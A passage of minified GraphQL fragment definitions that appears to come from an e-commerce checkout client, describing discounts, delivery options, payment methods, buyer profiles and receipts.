__typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode 